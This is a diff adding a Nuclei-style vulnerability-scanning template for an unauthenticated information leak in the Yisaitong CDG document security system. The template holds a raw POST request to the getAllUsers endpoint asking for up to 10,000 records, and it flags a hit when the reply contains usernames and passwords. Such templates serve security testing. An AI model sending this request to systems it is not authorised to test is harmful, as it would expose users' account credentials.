@@ -1,0 +1,27 @@
+id: yisaitong-CDG-getAllUsers-Information-disclosure
+
+info:
+  name: 亿赛通电子文档安全管理系统 getAllUsers 信息泄露
+  author: Huanxiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: Information Disclosure
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/openapi/getAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        pageSize=10000&pageNumber=1
+
+    matchers:
+      - type: dsl
+        name: 信息泄露
+        dsl:
+          - "status_code==200 && contains_all(body,'password','username')"
